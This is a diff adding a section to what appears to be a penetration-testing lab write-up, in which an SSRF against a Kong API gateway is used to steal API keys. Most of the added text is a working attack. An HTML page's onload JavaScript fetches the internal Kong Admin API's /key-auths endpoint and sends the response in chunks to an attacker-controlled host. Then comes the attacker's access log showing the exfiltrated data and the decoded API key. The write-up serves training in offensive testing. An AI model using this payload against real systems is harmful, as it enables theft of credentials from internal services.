@@ -629,5 +629,53 @@ Next, we'll turn our focus to stealing credentials from the Kong Admin API with 
 
 We can find the Admin API endpoint that returns API keys in Kong's documentation. Let's update our JavaScript function to call `/key-auths`, call the Render service, and then check `access.log`.
 ```html
-
+<html>
+<head>
+<script>
+function exfiltrate() {
+    // Send initial status
+    fetch("http://192.168.45.203/status?msg=script_started").catch(() => {});
+    
+    fetch("http://172.16.16.2:8001/key-auths")
+    .then((response) => {
+        fetch("http://192.168.45.203/status?msg=kong_response_received&status=" + response.status).catch(() => {});
+        return response.text();
+    })
+    .then((data) => {
+        fetch("http://192.168.45.203/status?msg=data_received&length=" + data.length).catch(() => {});
+        chunks = data.match(new RegExp('.{1,1024}','g'));
+        for(i = 0; i < chunks.length; i++) {
+            fetch("http://192.168.45.203/callback?chunk=" + i + "&data=" + encodeURIComponent(chunks[i])).catch(() => {});
+        }
+    })
+    .catch((error) => {
+        fetch("http://192.168.45.203/error?msg=" + encodeURIComponent(error.toString())).catch(() => {});
+    });
+}
+</script>
+</head>
+<body onload='exfiltrate()'>
+<div></div>
+</body>
+</html>
+```
+After triggering the SSRF, we got the response to our kali machine
+```log
+┌──(kali㉿kali)-[/var/www/html]
+└─$ tail -f /var/log/apache2/access.log           
+192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /exfil.html HTTP/1.1" 200 768 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /status?msg=script_started HTTP/1.1" 404 492 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /status?msg=kong_response_received&status=200 HTTP/1.1" 404 492 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /status?msg=data_received&length=213 HTTP/1.1" 404 493 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /callback?chunk=0&data=%7B%22next%22%3Anull%2C%22data%22%3A%5B%7B%22created_at%22%3A1613767827%2C%22id%22%3A%22c34c38b6-4589-4a1e-a8f7-d2277f9fe405%22%2C%22tags%22%3Anull%2C%22ttl%22%3Anull%2C%22key%22%3A%22SBzrCb94o9JOWALBvDAZLnHo3s90smjC%22%2C%22consumer%22%3A%7B%22id%22%3A%22a8c78b54-1d08-43f8-acd2-fb2c7be9e893%22%7D%7D%5D%7D HTTP/1.1" 404 493 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+```
+After decoding the data, we find the API key.
+```json
+{"next":null,"data":[{
+  "created_at":1613767827,
+  "id":"c34c38b6-4589-4a1e-a8f7-d2277f9fe405",
+  "tags":null,
+  "ttl":null,
+  "key":"SBzrCb94o9JOWALBvDAZLnHo3s90smjC",
+  "consumer":{"id":"a8c78b54-1d08-43f8-acd2-fb2c7be9e893"}}]}
 ```
